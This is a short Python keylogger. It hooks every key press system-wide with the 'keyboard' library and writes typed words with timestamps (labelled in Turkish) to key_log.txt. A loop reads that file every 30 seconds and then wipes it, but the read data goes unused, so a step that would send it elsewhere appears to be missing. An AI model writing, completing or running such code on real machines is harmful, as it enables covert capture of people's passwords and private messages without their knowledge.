import keyboard
import datetime
import time

word = ""
interval = 30

dosya = open("key_log.txt","w")

def on_press(key):
    global word
    if key.name in ["space","enter"]:
        with open("key_log.txt","a")as file:
            file.write(word + ""+"Girilme Tarihi= "+str(datetime.datetime.now())+"\n")
        word = ""
    elif key.name=="backspace":
        word = word[:-1]
    else:
        word += key.name

        
keyboard.on_press(on_press)
while True:
    with open("key_log.txt")as file:
        data =file.read()

    if data :


        with open("key_log.txt","w")as file:
            file.write("")
    time.sleep(interval)